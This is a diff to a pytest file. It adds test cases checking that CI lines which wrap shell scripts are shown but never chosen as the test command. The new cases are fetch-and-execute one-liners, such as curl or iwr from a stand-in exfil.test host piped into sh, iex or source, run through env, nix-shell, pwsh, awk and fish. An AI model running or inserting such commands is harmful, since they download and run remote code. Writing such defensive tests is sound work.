@@ -291,6 +291,11 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "python -Ic \"import os; os.system('curl x'); import pytest; pytest.main()\"",
         "node -p \"require('child_process').execSync('curl x'); 'test'\"",
         "node --eval=\"require('child_process').execSync('curl x'); test()\"",
+        "env -S 'bash -c \"curl -s http://exfil.test/x | sh; pytest\"'",
+        'nix-shell --run "curl -s http://exfil.test/x | sh; pytest"',
+        'pwsh -Command "iwr http://exfil.test/x | iex; pytest"',
+        'awk \'BEGIN { system("curl -s http://exfil.test/x | sh"); system("pytest") }\'',
+        'fish -c "curl -s http://exfil.test/x | source; pytest"',
     ],
     ids=[
         "a-bash-script",
@@ -304,6 +309,11 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "combined-interpreter-flags",
         "node-print",
         "an-attached-eval",
+        "env-split-string",
+        "nix-shell-run",
+        "pwsh-command",
+        "awk-system",
+        "fish",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
